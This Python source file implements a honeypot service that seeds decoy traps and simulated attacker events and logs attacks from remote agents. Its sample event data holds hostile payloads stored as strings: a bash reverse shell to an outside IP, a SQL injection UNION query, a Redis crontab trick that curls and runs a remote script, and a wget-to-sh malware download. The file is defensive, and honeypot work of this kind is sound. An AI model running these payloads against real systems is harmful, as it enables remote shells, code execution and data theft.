"""
Honeypot Decoy Service — Manages Decoy Traps, Captures Attacker IoCs & Pushes Prometheus Metrics
"""
import uuid
import random
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any, Optional

from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func, update

from app.models_honeypot import HoneypotTrap, HoneypotEvent, HoneypotTrapType, HoneypotSeverity


class HoneypotService:

    @staticmethod
    async def seed_honeypot_data(db: AsyncSession) -> Dict[str, Any]:
        """Seeds decoy traps and simulated attacker events."""
        result = await db.execute(select(HoneypotTrap))
        existing = result.scalars().all()
        if existing:
            return {"status": "Already seeded", "traps_count": len(existing)}

        now = datetime.now(timezone.utc)

        # 1. Traps
        traps_data = [
            {"name": "SSH Decoy Server (Port 2222)", "type": "SSH_DECOY", "port": 2222, "ip": "10.0.1.99", "host": "srv-ssh-decoy-01", "hits": 450},
            {"name": "Fake Admin Portal (Port 8080)", "type": "HTTP_ADMIN_PORTAL", "port": 8080, "ip": "10.0.1.100", "host": "admin-portal-decoy", "hits": 1280},
            {"name": "Unauthenticated Redis Trap (Port 6379)", "type": "REDIS_CLUSTER_DECOY", "port": 6379, "ip": "10.0.3.99", "host": "redis-honeypot", "hits": 310},
            {"name": "Legacy Telnet Switch Trap (Port 23)", "type": "TELNET_TRAP", "port": 23, "ip": "10.0.4.15", "host": "switch-core-legacy", "hits": 95},
            {"name": "Exposed MySQL Database Trap (Port 3306)", "type": "MYSQL_DECOY", "port": 3306, "ip": "10.0.3.101", "host": "mysql-honey-db", "hits": 620}
        ]

        trap_instances = []
        trap_map = {}
        for td in traps_data:
            trap = HoneypotTrap(
                id=str(uuid.uuid4()),
                name=td["name"],
                trap_type=td["type"],
                port=td["port"],
                target_server_ip=td["ip"],
                hostname=td["host"],
                status="ACTIVE",
                hits_count=td["hits"]
            )
            db.add(trap)
            trap_instances.append(trap)
            trap_map[td["name"]] = trap

        await db.flush()

        # 2. Attacker Events
        attacker_ips = ["185.220.101.4", "194.26.29.110", "45.143.200.12", "193.142.146.210"]
        countries = ["Russia", "China", "Netherlands", "United States"]

        events_samples = [
            {"trap": "SSH Decoy Server (Port 2222)", "ip": "185.220.101.4", "port": 2222, "sev": "CRITICAL", "creds": "root:admin123", "payload": "SSH-2.0-OpenSSH_8.2p1 / bash -i >& /dev/tcp/185.220.101.4/4444 0>&1", "type": "SSH_BRUTE_FORCE_AND_EXPLOIT"},
            {"trap": "Fake Admin Portal (Port 8080)", "ip": "194.26.29.110", "port": 8080, "sev": "HIGH", "creds": "admin' OR '1'='1", "payload": "GET /admin/login.php?user=admin' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables-- HTTP/1.1", "type": "SQLI_INJECTION_ATTEMPT"},
            {"trap": "Unauthenticated Redis Trap (Port 6379)", "ip": "45.143.200.12", "port": 6379, "sev": "CRITICAL", "creds": "none", "payload": "CONFIG SET dir /var/spool/cron/crontabs\nCONFIG SET dbfilename root\nSET payload \"* * * * * root curl -s http://145.2.1.2/min.sh | sh\"", "type": "REDIS_CRONTAB_RCE_ATTEMPT"},
            {"trap": "Exposed MySQL Database Trap (Port 3306)", "ip": "193.142.146.210", "port": 3306, "sev": "HIGH", "creds": "root:root", "payload": "CONNECT mysql_dump / SELECT @@version, user()", "type": "DATABASE_PROBING"}
        ]

        for i, es in enumerate(events_samples):
            trap_obj = trap_map.get(es["trap"])
            evt = HoneypotEvent(
                id=str(uuid.uuid4()),
                trap_id=trap_obj.id if trap_obj else None,
                trap_name=es["trap"],
                attacker_ip=es["ip"],
                attacker_country=countries[i % len(countries)],
                port=es["port"],
                severity=es["sev"],
                attempted_credentials=es["creds"],
                payload_sample=es["payload"],
                interaction_type=es["type"],
                timestamp=now - timedelta(minutes=i * 8)
            )
            db.add(evt)

        await db.commit()

        return {
            "status": "Success",
            "traps_created": len(traps_data),
            "events_created": len(events_samples)
        }

    @staticmethod
    async def simulate_attack(db: AsyncSession, trap_id: Optional[str] = None) -> Dict[str, Any]:
        """Simulates an active attacker hitting a honeypot decoy trap in real time."""
        await HoneypotService.seed_honeypot_data(db)

        stmt = select(HoneypotTrap)
        if trap_id:
            stmt = stmt.where(HoneypotTrap.id == trap_id)
        result = await db.execute(stmt)
        traps = result.scalars().all()

        target_trap = random.choice(traps) if traps else None
        if not target_trap:
            raise ValueError("No trap available")

        # Increment hits
        target_trap.hits_count += 1

        attacker_ip = f"185.220.{random.randint(100, 255)}.{random.randint(1, 254)}"
        event = HoneypotEvent(
            id=str(uuid.uuid4()),
            trap_id=target_trap.id,
            trap_name=target_trap.name,
            attacker_ip=attacker_ip,
            attacker_country=random.choice(["Russia", "China", "Brazil", "Germany", "United States"]),
            port=target_trap.port,
            severity="CRITICAL",
            attempted_credentials=random.choice(["admin:P@ssword1", "root:root123", "postgres:postgres"]),
            payload_sample=f"ATTACKER PAYLOAD CAPTURED on {target_trap.name}: wget http://{attacker_ip}/malware.sh -O- | sh",
            interaction_type="SIMULATED_HONEYPOT_EXPLOIT",
            timestamp=datetime.now(timezone.utc)
        )
        db.add(event)
        await db.commit()

        return {
            "status": "Attack Captured",
            "trap": target_trap.name,
            "attacker_ip": attacker_ip,
            "severity": "CRITICAL",
            "event_id": event.id
        }

    @staticmethod
    async def record_remote_attack(
        db: AsyncSession,
        trap_name: str,
        attacker_ip: str,
        payload_sample: str,
        protocol: str = "TCP",
        port: int = 2222,
        country: str = "Unknown"
    ) -> Dict[str, Any]:
        """Records a real-time attack reported by a remote Honeypot daemon agent."""
        await HoneypotService.seed_honeypot_data(db)

        evt = HoneypotEvent(
            id=str(uuid.uuid4()),
            trap_id=str(uuid.uuid4()),
            trap_name=trap_name,
            attacker_ip=attacker_ip,
            attacker_country=country,
            port=port,
            severity="CRITICAL",
            attempted_credentials="remote-agent-capture",
            payload_sample=payload_sample,
            interaction_type=f"REMOTE_AGENT_{protocol.upper()}",
            timestamp=datetime.now(timezone.utc)
        )
        db.add(evt)

        # Increment hits on matching trap if present
        res = await db.execute(select(HoneypotTrap).where(HoneypotTrap.port == port))
        trap_obj = res.scalars().first()
        if trap_obj:
            trap_obj.hits_count += 1

        await db.commit()

        return {
            "status": "Remote Attack Logged",
            "event_id": evt.id,
            "trap_name": trap_name,
            "attacker_ip": attacker_ip,
            "timestamp": evt.timestamp.isoformat()
        }

